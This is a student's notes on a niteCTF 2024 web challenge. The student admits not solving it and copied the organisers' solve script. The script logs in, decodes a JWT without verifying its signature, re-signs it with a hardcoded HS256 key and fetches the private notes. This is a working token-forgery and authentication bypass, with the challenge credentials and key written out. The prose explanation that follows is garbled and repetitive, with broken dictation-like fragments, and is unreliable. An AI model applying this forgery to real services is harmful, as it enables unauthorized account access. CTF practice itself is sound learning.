DID NOT SOLVE ANY OF THE CHAL
# CYBERNOTES
## step 1
import jwt
import json
import requests

USERNAME = "D3aDs0ck"
PASSW = "bluM#_M@y_N3vr"
KEY = "H6jga21h1"

# URL = "http://127.0.0.1:5000/"
URL = "https://cyber-notes.chalz.nitectf2024.live/"

print("USERNAME:", USERNAME)
print("PASSWORD:", PASSW)
print("JWT KEY:", KEY)
print("URL:", URL)

# Get fake JWT
payload = json.dumps({
    "username": USERNAME,
    "password": PASSW
})
response = requests.request(
    "POST", URL+"api/login",  data=payload, headers={'Content-Type': 'application/json'})

fake_token = json.loads(response.text)["token"]

print("FAKE TOKEN:", fake_token)

# Sign fake jwt with real key to get real key
decoded = jwt.decode(fake_token, options={"verify_signature": False})
new_token = jwt.encode(decoded, KEY, algorithm='HS256')
print("REAL TOKEN:", new_token)

# Use new token to get real notes
payload = json.dumps({
    "username": USERNAME,
    "password": PASSW
})
response = requests.request("GET", URL+"api/notes",
                            headers={'Authorization': "Bearer " + new_token})

print(response.text)
## step 2
The goal of the challenge is to bypass a login system and access the private nodes which is basically the flag the challenge uses J W days to authenticate users
 the challenge uses J W days to authenticate users. J W T is a way for the server to tru....every request to prove their identity
 J W T is a way for the server to trust the user after logging in the server gives the user a token the user sends his token in every request to prove their identity
The first part of the script consists of variables username password which is basically to log into the w.... endpoint and gets a token end router
 which is basically to log into the website with the usernames and passwords it sends a request to login endpoint and gets a token end router
But here the token is fake in the sense it doesn't have a proper security cheque now this decode the fake job
 now this decode the fake job Yadav decoded equal to JW Dot decode fake token it decorates a token without showing....he token but doesn't verify if it was
 it decorates a token without showing its validity this means it can see the content of the token but doesn't verify if it was

Now let's access the new private data using the new token and get the flag
basically run this python pgm in a compiler or wsl
using vi new,py
add the code
and run python3 new.py

## what i learnt
JWT
understood some part of the code..but still have a little confusion
as im not familiar to how to interact withn a wwebsite using pyhton
## other methods
Use compiler or the wsl terminal to run pgm
## refernces
https://github.com/Cryptonite-MIT/niteCTF-2024/blob/main/webex/cybernotes/solution/solve.py





